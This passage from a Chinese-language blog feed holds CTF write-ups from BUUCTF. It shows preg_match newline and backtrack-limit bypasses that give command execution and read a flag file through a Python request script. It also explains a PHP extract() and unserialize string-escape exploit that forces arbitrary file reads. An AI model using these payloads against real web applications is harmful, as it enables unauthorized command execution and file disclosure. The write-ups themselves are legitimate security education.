&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先对传入的 cmd 检测是否为字符串，如果是字符串就进行正则的检测，但是也没看到 cat 啥的被过滤啊</p><p>在看 wp 的时候看到了这个是和环境变量有关系， <code>putenv('PATH=/home/rceservice/jail');</code>  本题的环境变量被替换成了这个，而 cat 一般都是在 <code>usr/bin</code>  目录下的，所以用这个命令需要使用绝对路径</p><p>正则匹配表达式采用了 <code>^    $</code>  的格式，同时也采用了 <code>.*</code>  这样的贪婪匹配，这就可以引出两种解法，一个是 <code>%0A</code>  的 <code>preg_match</code>  的多行绕过和回溯次数超限，详细的回溯次数超限可以看这个 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</p><p><strong>%0A</strong></p><p>%0A 的绕过是因为 preg_match 只会匹配一行的数据，加上正则表达式中存在 <code>\x00-\x1FA</code>  会匹配一个 %0A</p><p>所以构造 payload 的时候，前后多加几个 %0A 就能达成绕过的效果了</p><p>先查看 path 环境下各级目录，能不能找到 flag，jail 就是 index.php 已经知道了，查看上一级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0A&#123;&quot;cmd&quot;:&quot;ls /home/rceservice/&quot;&#125;%0A%0A</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b4.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>存在 flag，直接读取，注意要用 cat 的绝对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0A&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;%0A%0A</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b3.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><strong>回溯次数超限</strong></p><p>详细的可以看上面提到的链接，这里直接上脚本读取了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4e855554-62b3-45bc-a775-aed80066cc3e.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;temp&quot;:&quot;&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url,data=payload).text</span><br><span class="line"><span class="built_in">print</span>(req)</span><br></pre></td></tr></table></figure><p>变量 cmd 后面不能直接跟用来超出回溯限制的内容，会影响命令，所以需要一个新的变量用来存用来回溯的内容，这里引入新的变量 temp</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b5.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>参考：<a href="https://www.cnblogs.com/Article-kelp/p/16046129.html">https://www.cnblogs.com/Article-kelp/p/16046129.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/110573955">https://blog.csdn.net/rfrder/article/details/110573955</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;gyctf2020flaskapp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#gyctf2020flaskapp&quot;&gt;#&lt;/a&gt; [GYCTF2020]FlaskApp&lt;/h2&gt;</summary>
    
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/categories/buuctf/"/>
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题4</title>
    <link href="https://dr4x3zz.github.io/2024/02/25/buuctf%E5%88%B7%E9%A2%984/"/>
    <id>https://dr4x3zz.github.io/2024/02/25/buuctf%E5%88%B7%E9%A2%984/</id>
    <published>2024-02-25T15:22:18.000Z</published>
    <updated>2024-04-16T12:57:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安洵杯-2019easy_serialize_php"><a class="markdownIt-Anchor" href="#安洵杯-2019easy_serialize_php">#</a> [安洵杯 2019] easy_serialize_php</h2><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>implode('|', $filter_arr)</code> ：这个函数调用将 <code>$filter_arr</code>  中的元素连接成一个字符串，用 <code>|</code> （在正则表达式中代表 “或” 操作符）分隔。 <code>preg_replace()</code>  函数执行一个正则表达式的搜索和替换，将 <code>'php','flag','php5','php4','fl1g'</code>  替换成空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>unset()</code>  函数用于销毁给定的变量。</p><p>销毁后又重置 <code>$_SESSION</code></p><p><code>extract()</code>  函数从数组中将变量导入到当前的符号表。看的是这个师傅的 wp：<a href="https://www.cnblogs.com/h3zh1/p/12732336.html%E3%80%82">https://www.cnblogs.com/h3zh1/p/12732336.html。</a></p><p><strong>extract () 变量覆盖</strong></p><p>根据 extract () 我们可以进行变量覆盖，当我们传入 SESSION [flag]=123 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mo stretchy="false">[</mo><mi mathvariant="normal">&quot;</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">]</mo><mtext>和</mtext></mrow><annotation encoding="application/x-tex">SESSION[&quot;user&quot;]和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord">&quot;</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord">&quot;</span><span class="mclose">]</span><span class="mord cjk_fallback">和</span></span></span></span> SESSION [‘function’] 全部会消失。</p><p>只剩下_SESSION [flag]=123。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a2.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>function 的 value 是由 <code>$_GET['f']</code>  传进来的当以 get 方法传入 img_path 的情况下， <code>$_SESSION['img']</code>  为传入的 img_path 进行 base64 加密和 sha1 加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>如果 <code>function</code>  参数为 <code>phpinfo</code>  则回显 <code>phpinfo()</code> ，注释又告诉我们可以在其中找到一些东西，那就让 <code>f=phpinfo</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a1.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>找到可疑文件 <code>d0g3_f1ag.php</code></p><p>通过代码审计，我们要想获得 flag，需要改变 <code>img_path</code>  的内容或者直接改变 <code>userinfo['img']</code>  来读取 flag 文件</p><p>这里看别的师傅的 wp，这一题要用到反序列化逃逸，参考 wp：<a href="https://blog.csdn.net/m0_62879498/article/details/124644325%EF%BC%8Chttps://www.cnblogs.com/h3zh1/p/12732336.html%E4%B8%BB%E8%A6%81%E5%8F%AF%E4%BB%A5%E4%BB%94%E7%BB%86%E7%9C%8B%E7%9C%8B%E5%90%8E%E9%9D%A2%E7%9A%84%E9%82%A3%E4%B8%80%E7%AF%87%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%85%B7%E4%BD%93%EF%BC%8C%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E3%80%82">https://blog.csdn.net/m0_62879498/article/details/124644325，https://www.cnblogs.com/h3zh1/p/12732336.html 主要可以仔细看看后面的那一篇，写的很具体，记录一下。</a></p><blockquote><p>反序列化逃逸的原理<br>在构造键值的时候被过滤掉了，但序列化后的字符串记录的长度不会因为过滤而改变，所以就会把序列化后的字符串的结构当做值的内容给读取。<br>如果我们自己构造出反序列化字符串的结构，并因为过滤破坏掉原来的结构，就可以构造出恶意代码。</p></blockquote><p>直接改 <code>userinfo['img']</code>  反序列化字符逃逸的两种方法：键值逃逸，键名逃逸</p><p><strong>键值逃逸：</strong></p><p>这里先看一个正规的序列化字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#正规序列化的字符串</span><br><span class="line">&quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;;</span><br><span class="line">#带有多余的字符的字符串</span><br><span class="line">&quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;;s:3:&quot;真的垃圾img&quot;;lajilaji&quot;;</span><br></pre></td></tr></table></figure><p><code>a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;</code>  拿着一串序列化字符串来说，a 代表数组，2 代表有两个键值分别是 one 和 two，他们对应的值 flag 和 test 决定 <code>s:4:&quot;flag&quot;</code>  中的数字，这个数字是字符 flag 和 test 的长度，以此类推 one 和 two 前面的 3 也是他们的长度，其中 s 是代表字符串。</p><p>如果字符串多出了或者少了会是什么情况，原理：因为序列化后的字符串是严格的，对应的格式不能错，比如 <code>s:4:&quot;name&quot;</code> , 那 <code>s:4</code>  就必须有一个字符串长度是 4 的否则就往后要，比如说 <code>s:4:&quot;flag&quot;</code> ，如果变成 <code>s:5</code> ，那么对应的值会从 <code>flag</code>  变成 <code>flag&quot;</code> 。并且 unserialize 会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。上述带有多余的字符串经过反序列化之后得到的会是 <code>&quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</code> 。</p><p>如果我们传入的序列化字符串内容敏感被过滤了会发生什么情况，在这一题内，flag 和 php 等敏感字符被过滤，我们如果传入 <code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ，被过滤之后变成 <code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p><p>此时解读反序列化后会怎么样，a 由三个键值， <code>s:4:&quot;user&quot;</code> ，得到 user 键值，对应的属性值由于被过滤了，所以出现 <code>s:24:&quot;&quot;</code>  情况，但是根据序列化和反序列化的格式他会继续往后读取 24 个字符作为 user 的属性值，因此 user 属性值为 <code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code> ，然后 <code>s:3:&quot;img&quot;</code> ，参数 img 正常读取， <code>s:2:&quot;dd&quot;</code>  参数 dd 正常读取，多余的部分为 <code>;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>  直接舍弃。</p><p>知道了原理，我们就可以结合源码构造 payload，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>$serialize_info</code>  是序列化的 <code>$_SESSION</code> ，在下面又把 <code>$serialize_info</code>  反序列化了，在这里我们就可以利用漏洞，构造一个序列化前的一个参数包含有序列化了的 img 参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flagphp&#x27;</span>] = <span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#a:2:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>解读一下 a 两个键值 flagphp 经过 filter 过滤，直接为空，所以参数变为 <code>&quot;;s:48:</code> ，值为 <code>s:1:&quot;1&quot;</code> ，然后就到了第二个参数 img，这个 img 是我们直接构造的， <code>ZDBnM19mMWFnLnBocA==</code>  是 <code>d0g3_f1ag.php</code>  的 base64 编码，读取完之后剩下的字符串直接丢弃，这样就可已通过 <code>file_get_contents(base64_decode($userinfo['img']));</code>  源码内的函数输出 <code>d0g3_f1ag.php</code></p><p>所以这里只需要我们 post 一个新值 <code>_SESSION['flagphp']=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>  其他的序列化反序列化操作都交给源码去做，这里可以把 php 的格式删掉，<strong>同时别忘了 get 传参 <code>show_image</code>  才能进入反序列化和输出的函数</strong></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a3.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>页面没有直接显示但是 f12 或者查看页面源代码就可以获得如下信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>好家伙还有一层 <code>/d0g3_fllllllag</code>  拿去 base64 加密之后 <code>L2QwZzNfZmxsbGxsbGFn</code>  刚好 20 位，直接替换刚刚 payload 中 img 的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># GET</span><br><span class="line">?f=show_image</span><br><span class="line"># POST</span><br><span class="line">_SESSION[&#x27;flagphp&#x27;]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a4.png" class="lazyload" 